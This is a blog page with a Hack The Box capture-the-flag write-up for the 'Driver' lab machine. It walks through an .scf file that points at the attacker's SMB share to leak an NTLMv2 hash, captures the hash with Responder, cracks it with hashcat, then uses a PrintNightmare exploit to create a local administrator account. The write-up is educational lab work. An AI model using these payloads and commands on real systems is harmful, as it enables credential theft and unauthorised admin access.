@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+  <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="shortcut icon" href="https://jordangalida.github.io/images/ability_poisons.jpg" />
+<title>HTB Driver Write-up | Jordan&#39;s Blog</title>
+<meta name="title" content="HTB Driver Write-up" />
+<meta name="description" content="A write-up for the Driver box." />
+<meta name="keywords" content="HTB,Pentesting," />
+
+
+<meta property="og:url" content="https://jordangalida.github.io/htb-driver-write-up/">
+  <meta property="og:site_name" content="Jordan&#39;s Blog">
+  <meta property="og:title" content="HTB Driver Write-up">
+  <meta property="og:description" content="A write-up for the Driver box.">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="blog">
+    <meta property="article:published_time" content="2025-02-18T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-02-18T00:00:00+00:00">
+    <meta property="article:tag" content="HTB">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="og:image" content="https://jordangalida.github.io/images/share.png">
+
+
+
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://jordangalida.github.io/images/share.png">
+  <meta name="twitter:title" content="HTB Driver Write-up">
+  <meta name="twitter:description" content="A write-up for the Driver box.">
+
+
+
+
+  <meta itemprop="name" content="HTB Driver Write-up">
+  <meta itemprop="description" content="A write-up for the Driver box.">
+  <meta itemprop="datePublished" content="2025-02-18T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-02-18T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1103">
+  <meta itemprop="image" content="https://jordangalida.github.io/images/share.png">
+  <meta itemprop="keywords" content="HTB,Pentesting">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+  <style>
+  :root {
+      --width: 800px;
+      --font-main: "Courier New", monospace;
+      --font-secondary: "Courier New", monospace;
+      --font-scale: 1em;
+      --background-color: #fff;
+      --heading-color: #222;
+      --text-color: #444;
+      --link-color: #32ab60;
+      --visited-color:  #32ab60;
+      --code-background-color: #f2f2f2;
+      --code-color: #222;
+      --blockquote-color: #222;
+      --overflow-wrap: break-word;
+  }
+
+  @media (prefers-color-scheme: dark) {
+      :root {
+          --background-color: #070b0a;
+          --heading-color: #32ab60;
+          --text-color: #32ab60;
+          --link-color: #32ab60;
+          --visited-color:  #32ab60;
+          --code-background-color: #272822;
+          --code-color: #ddd;
+          --blockquote-color: #ccc;
+      }
+  }
+
+  body {
+      font-family: var(--font-secondary);
+      font-size: var(--font-scale);
+      margin: auto;
+      padding: 20px;
+      max-width: var(--width);
+      text-align: left;
+      background-color: var(--background-color);
+      word-wrap: break-word;
+      overflow-wrap: break-word;
+      white-space: normal;
+      line-height: 1.5;
+      color: var(--text-color);
+  }
+
+  h1, h2, h3, h4, h5, h6 {
+      font-family: var(--font-main);
+      color: var(--heading-color);
+  }
+
+  a {
+      color: var(--link-color);
+      cursor: pointer;
+      text-decoration: none;
+  }
+
+  a:hover {
+      text-decoration: underline; 
+  }
+
+  nav a {
+      margin-right: 8px;
+  }
+
+  strong, b {
+      color: var(--heading-color);
+  }
+
+  button {
+      margin: 0;
+      cursor: pointer;
+  }
+
+  main {
+      line-height: 1.6;
+  }
+
+  table {
+      width: 100%;
+  }
+
+  hr {
+      border: 0;
+      border-top: 1px dashed;
+  }
+
+  img {
+      max-width: 100%;
+  }
+
+  pre {
+      white-space: pre-wrap !important;
+      overflow-x: auto !important;
+      word-break: break-all !important;
+      max-width: var(--width) !important;
+      margin: 0 !important;
+  }
+
+  code {
+      font-family: "Courier New", monospace;
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      white-space: pre-wrap;
+      word-wrap: break-word;
+      overflow-wrap: anywhere;
+  }
+
+  blockquote {
+      border-left: 1px solid #999;
+      color: var(--code-color);
+      padding-left: 20px;
+      font-style: italic;
+      text-wrap: wrap;
+  }
+
+  footer {
+      padding: 25px 0;
+      text-align: center;
+  }
+
+  .title:hover {
+      text-decoration: none;
+  }
+
+  .title h1 {
+      font-size: 1.5em;
+  }
+
+  .inline {
+      width: auto !important;
+  }
+
+  .highlight, .code {
+      background-color: var(--code-background-color);
+      color: var(--code-color);
+      padding: 5px 10px;
+      word-break: normal;
+      white-space: pre-wrap; 
+      overflow-wrap: anywhere;
+      overflow-x: auto;
+  }
+
+   
+  ul.blog-posts {
+      list-style-type: none;
+      padding: unset;
+  }
+
+  ul.blog-posts li {
+      display: flex;
+  }
+
+  ul.blog-posts li span {
+      flex: 0 0 130px;
+  }
+
+  ul.blog-posts li a:visited {
+      color: var(--visited-color);
+</style>
+
+</head>
+
+<body>
+  <header><a href="/" class="title">
+  <h2>Jordan&#39;s Blog</h2>
+</a>
+<nav><a href="/">Home</a>
+
+
+<a href="/blog">Blog</a>
+
+</nav>
+</header>
+  <main>
+
+<h1>HTB Driver Write-up</h1>
+<p>
+  <i>
+    <time datetime='2025-02-18'>
+      18 Feb, 2025
+    </time>
+  </i>
+</p>
+
+<content>
+  <p>This box starts off with a website where you can upload printer drivers, which is a hint to a known critical vulnerability that happened pretty recently. The website says that anything uploaded will be reviewed by someone. In order to gain initial access, you need to upload a file that will execute when viewed such as a <code>.scf</code> or <code>.lnk</code> file that reaches out to an SMB server that we control while running a tool like <code>Responder</code>. This allows you to catch an NTLMv2 hash that can be cracked to gain access as the user Tony. To escalate privileges, you exploit the <code>PrintNightmare</code> vulnerability.</p>
+<hr>
+<p>We start off with our nmap scans</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap --open 10.10.11.106 -oA driver_top1k
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 18:44 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.106
+</span></span><span style="display:flex;"><span>Host is up (0.028s latency).
+</span></span><span style="display:flex;"><span>Not shown: 997 filtered tcp ports (no-response)
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>80/tcp  open  http
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span></code></pre></div><p>We do another to scan all ports with scripting and version detection enabled</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -sV -sC -p- 10.10.11.106 -oA driver_all
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 19:07 EST
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.11.106
+</span></span><span style="display:flex;"><span>Host is up (0.026s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65531 filtered tcp ports (no-response)
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>80/tcp   open  http         Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>| http-methods:
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>| http-auth:
+</span></span><span style="display:flex;"><span>| HTTP/1.1 401 Unauthorized\x0D
+</span></span><span style="display:flex;"><span>|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
+</span></span><span style="display:flex;"><span>135/tcp  open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+</span></span><span style="display:flex;"><span>5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Host script results:
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2025-02-19T07:09:54
+</span></span><span style="display:flex;"><span>|_  start_date: 2025-02-19T06:39:18
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m58s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   3:1:1:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb-security-mode:
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled (dangerous, but default)
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 155.05 seconds
+</span></span></code></pre></div><p>Let&rsquo;s check out the website and see if there are any SMB shares we can view</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$smbclient -N -L //10.10.11.106/
+</span></span><span style="display:flex;"><span>session setup failed: NT_STATUS_ACCESS_DENIED
+</span></span></code></pre></div><p>No dice. Let&rsquo;s look at the website. Immediately upon visiting the website, we are asked to login
+<img src="/images/Driver/login.png" alt="Login"></p>
+<p>We try a simple credential pair <code>admin:admin</code> and we get in
+<img src="/images/Driver/homepage.png" alt="Homepage"></p>
+<p>On the /fw_up.php page it looks like we can upload firmware
+<img src="/images/Drive/firmware" alt="Firmware"></p>
+<p>Since this is a Windows box, let&rsquo;s try to upload a reverse shell. Nothing. It says that a user will review the files, so can we get something to execute when someone visits wherever this file is being uploaded? Yes, we can use a .lnk or .scf file</p>
+<pre tabindex="0"><code class="language-scf" data-lang="scf">$cat click.scf
+[Shell]
+Command=2
+IconFile=\\10.10.14.24\share\legit.ico
+[Taskbar]
+Command=ToggleDesktop
+</code></pre><p>Then set up responder, and upload the file</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo responder -I tun0 -w
+</span></span><span style="display:flex;"><span>                                         __
+</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+</span></span><span style="display:flex;"><span>                   |__|
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  To support this project:
+</span></span><span style="display:flex;"><span>  Patreon -&gt; https://www.patreon.com/PythonResponder
+</span></span><span style="display:flex;"><span>  Paypal  -&gt; https://paypal.me/PythonResponder
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+</span></span><span style="display:flex;"><span>  To kill this script hit CTRL-C
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Poisoners:
+</span></span><span style="display:flex;"><span>    LLMNR                      [ON]
+</span></span><span style="display:flex;"><span>    NBT-NS                     [ON]
+</span></span><span style="display:flex;"><span>    MDNS                       [ON]
+</span></span><span style="display:flex;"><span>    DNS                        [ON]
+</span></span><span style="display:flex;"><span>    DHCP                       [OFF]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Servers:
+</span></span><span style="display:flex;"><span>    HTTP server                [ON]
+</span></span><span style="display:flex;"><span>    HTTPS server               [ON]
+</span></span><span style="display:flex;"><span>    WPAD proxy                 [ON]
+</span></span><span style="display:flex;"><span>    Auth proxy                 [OFF]
+</span></span><span style="display:flex;"><span>    SMB server                 [ON]
+</span></span><span style="display:flex;"><span>    Kerberos server            [ON]
+</span></span><span style="display:flex;"><span>    SQL server                 [ON]
+</span></span><span style="display:flex;"><span>    FTP server                 [ON]
+</span></span><span style="display:flex;"><span>    IMAP server                [ON]
+</span></span><span style="display:flex;"><span>    POP3 server                [ON]
+</span></span><span style="display:flex;"><span>    SMTP server                [ON]
+</span></span><span style="display:flex;"><span>    DNS server                 [ON]
+</span></span><span style="display:flex;"><span>    LDAP server                [ON]
+</span></span><span style="display:flex;"><span>    RDP server                 [ON]
+</span></span><span style="display:flex;"><span>    DCE-RPC server             [ON]
+</span></span><span style="display:flex;"><span>    WinRM server               [ON]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] HTTP Options:
+</span></span><span style="display:flex;"><span>    Always serving EXE         [OFF]
+</span></span><span style="display:flex;"><span>    Serving EXE                [OFF]
+</span></span><span style="display:flex;"><span>    Serving HTML               [OFF]
+</span></span><span style="display:flex;"><span>    Upstream Proxy             [OFF]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Poisoning Options:
+</span></span><span style="display:flex;"><span>    Analyze Mode               [OFF]
+</span></span><span style="display:flex;"><span>    Force WPAD auth            [OFF]
+</span></span><span style="display:flex;"><span>    Force Basic Auth           [OFF]
+</span></span><span style="display:flex;"><span>    Force LM downgrade         [OFF]
+</span></span><span style="display:flex;"><span>    Force ESS downgrade        [OFF]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Generic Options:
+</span></span><span style="display:flex;"><span>    Responder NIC              [tun0]
+</span></span><span style="display:flex;"><span>    Responder IP               [10.10.14.24]
+</span></span><span style="display:flex;"><span>    Responder IPv6             [dead:beef:2::1016]
+</span></span><span style="display:flex;"><span>    Challenge set              [random]
+</span></span><span style="display:flex;"><span>    Don&#39;t Respond To Names     [&#39;ISATAP&#39;]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Current Session Variables:
+</span></span><span style="display:flex;"><span>    Responder Machine Name     [WIN-6AUOB2VBSPK]
+</span></span><span style="display:flex;"><span>    Responder Domain Name      [WG6O.LOCAL]
+</span></span><span style="display:flex;"><span>    Responder DCE-RPC Port     [48873]
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[+] Listening for events...
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>[SMB] NTLMv2-SSP Client   : 10.10.11.106
+</span></span><span style="display:flex;"><span>[SMB] NTLMv2-SSP Username : DRIVER\tony
+</span></span><span style="display:flex;"><span>[SMB] NTLMv2-SSP Hash     : tony::DRIVER:e61c06821dd7d97b:04C5D97EC19DB7997DB3D4C22BB85E03:010100000000000080270D804D82DB01340387C218E4BE3500000000020008005700470036004F0001001E00570049004E002D003600410055004F004200320056004200530050004B0004003400570049004E002D003600410055004F004200320056004200530050004B002E005700470036004F002E004C004F00430041004C00030014005700470036004F002E004C004F00430041004C00050014005700470036004F002E004C004F00430041004C000700080080270D804D82DB0106000400020000000800300030000000000000000000000000200000087AC8875FCF9D30115565877B7878955455C2EF04BE88643C220A9FCB19D0600A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0032003400000000000000000000000000
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span><span style="display:flex;"><span>[*] Skipping previously captured hash for DRIVER\tony
+</span></span></code></pre></div><p>We receive a hash! Let&rsquo;s try to crack it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$hashcat -m <span style="color:#ae81ff">5600</span> tony_hash /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt; 
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>TONY::DRIVER:e61c06821dd7d97b:04c5d97ec19db7997db3d4c22bb85e03:010100000000000080270d804d82db01340387c218e4be3500000000020008005700470036004f0001001e00570049004e002d003600410055004f004200320056004200530050004b0004003400570049004e002d003600410055004f004200320056004200530050004b002e005700470036004f002e004c004f00430041004c00030014005700470036004f002e004c004f00430041004c00050014005700470036004f002e004c004f00430041004c000700080080270d804d82db0106000400020000000800300030000000000000000000000000200000087ac8875fcf9d30115565877b7878955455c2ef04be88643c220a9fcb19d0600a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003400000000000000000000000000:liltony
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>&lt;SNIP&gt;
+</span></span></code></pre></div><p>And we crack the password! Now we can log in since WinRM is open</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$evil-winrm -i 10.10.11.106 -u TONY -p liltony
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt;
+</span></span></code></pre></div><p>We can grab the user flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Desktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>f37fe958f29a555e286267d4a15a0fc0
+</span></span></code></pre></div><p>With everything so far being about printers, it would be appropriate to check for the PrintNightmare vulnerability. Let&rsquo;s check if the spooler service is running</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; ls \\localhost\pipe\spoolss
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> \\localhost\pipe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>                                                 spoolss
+</span></span></code></pre></div><p>Let&rsquo;s transfer over the <a href="https://github.com/calebstewart/CVE-2021-1675">PowerShell implementation</a> and bypass the execution policy</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; Set-ExecutionPolicy Bypass -Scope <span style="color:#66d9ef">Process</span>
+</span></span></code></pre></div><p><em>Note: if you try something like <code>powershell -ep bypass</code> it won&rsquo;t work</em></p>
+<p>Then we import the module and create an admin user</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; Invoke-Nightmare -NewUser <span style="color:#e6db74">&#34;hacker&#34;</span> -NewPassword <span style="color:#e6db74">&#34;Pwnd1234!&#34;</span> -DriverName <span style="color:#e6db74">&#34;PrintIt&#34;</span>
+</span></span><span style="display:flex;"><span>[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
+</span></span><span style="display:flex;"><span>[+] using pDriverPath = <span style="color:#e6db74">&#34;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll&#34;</span>
+</span></span><span style="display:flex;"><span>[+] added user hacker as local administrator
+</span></span><span style="display:flex;"><span>[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
+</span></span></code></pre></div><p>We see that our user has been added</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; net user
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User accounts <span style="color:#66d9ef">for</span> \\
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>Administrator            DefaultAccount           Guest
+</span></span><span style="display:flex;"><span>hacker                   tony
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\tony\Documents&gt; net localgroup administrators
+</span></span><span style="display:flex;"><span>Alias name     administrators
+</span></span><span style="display:flex;"><span>Comment        Administrators have complete and unrestricted access to the computer/domain
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Members
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
+</span></span><span style="display:flex;"><span>Administrator
+</span></span><span style="display:flex;"><span>hacker
+</span></span><span style="display:flex;"><span>The command completed successfully.
+</span></span></code></pre></div><p>Now we can log in as that user</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">└──╼</span> $evil-winrm -i <span style="color:#ae81ff">10.10</span>.11.106 -u hacker -p <span style="color:#e6db74">&#34;Pwnd1234!&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning<span style="color:#960050;background-color:#1e0010">:</span> Remote path completions is disabled due to ruby limitation<span style="color:#960050;background-color:#1e0010">:</span> quoting_detection_proc() <span style="color:#66d9ef">function</span> is unimplemented on this machine
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data<span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#66d9ef">For</span> more information, check Evil-WinRM GitHub<span style="color:#960050;background-color:#1e0010">:</span> https<span style="color:#960050;background-color:#1e0010">:</span>//github.com/Hackplayers/evil-winrm<span style="color:#75715e">#Remote-path-completion</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info<span style="color:#960050;background-color:#1e0010">:</span> Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\hacker\Documents&gt;
+</span></span></code></pre></div><p>Then we can grab the root flag from the administrator&rsquo;s desktop</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\users\administrator\Desktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>eed37470a518c3102764fbd54c09a40a
+</span></span></code></pre></div>
+</content>
+<p>
+  
+  <a href="https://jordangalida.github.io/blog/htb/">#HTB</a>
+  
+  <a href="https://jordangalida.github.io/blog/pentesting/">#Pentesting</a>
+  
+</p>
+
+  </main>
+  <footer>Made with <a href="https://github.com/janraasch/hugo-bearblog/">Hugo ʕ•ᴥ•ʔ Bear</a>
+</footer>
+
+    
+</body>
+
+</html>
